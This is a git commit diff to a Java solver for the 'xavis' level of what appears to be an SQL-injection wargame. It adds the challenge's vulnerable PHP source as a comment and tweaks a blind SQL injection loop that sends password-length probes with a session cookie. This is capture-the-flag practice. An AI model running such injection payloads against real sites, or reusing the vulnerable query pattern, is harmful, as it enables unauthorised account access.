d5f6a31de338183baae2c73b2924e2d629ba5d94
se-hyun Hwang <imscs21@naver.com>
2016-12-29 20:28:28 +0900

    Update Xavis.java

--- Xavis.java
+++ Xavis.java
@@ -1,6 +1,28 @@
 import java.io.*;
 import java.util.*;
 import java.net.*;
+/*  ====P-R-O-B-L-E-M====
+ * 
+ * <?php
+  include "./config.php"; 
+  login_chk(); 
+  dbconnect(); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
+  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysql_fetch_array(mysql_query($query)); 
+  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
+   
+  $_GET[pw] = addslashes($_GET[pw]); 
+  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
+  $result = @mysql_fetch_array(mysql_query($query)); 
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
+  highlight_file(__FILE__); 
+?>
+ * 
+ */
+
 
 public class Xavis
 implements Runnable
@@ -72,7 +94,7 @@ implements Runnable
 			final String cookie_content = "PHPSESSID="+conf.getToken()+";";
 			int pwlen=-1;
 			String content="";
-			int lenhelper = 40;
+			int lenhelper = 1;
 			while(pwlen==-1){
 				String sub_query = "?"+String.format("pw=%%27%%20or%%20length(pw)=%d%%20%s%%23",lenhelper,URLEncoder.encode(" and id='admin' "));
 				content=queryContent(conf,cookie_content,sub_query);
